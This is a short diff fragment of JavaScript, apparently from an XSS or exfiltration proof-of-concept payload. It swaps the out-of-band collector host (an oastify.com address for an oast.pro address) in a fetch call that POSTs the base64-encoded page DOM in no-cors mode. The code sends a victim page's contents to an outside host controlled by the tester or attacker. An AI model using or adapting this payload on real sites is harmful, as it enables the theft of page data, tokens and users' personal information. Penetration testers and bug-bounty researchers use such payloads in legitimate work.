@@ -13,7 +13,7 @@
         const encodedDOM = btoa(domContent);
 
         // Send the encoded DOM to your server using 'no-cors'
-        await fetch('https://ld29n758zv4sitc3md900718rzxrlh96.oastify.com', {
+        await fetch('https://ctt9bb1ntu5vn2phjlj0n815zjofqc4jg.oast.pro', {
             method: 'POST',
             mode: 'no-cors', // Bypass CORS but limits response visibility
             headers: {
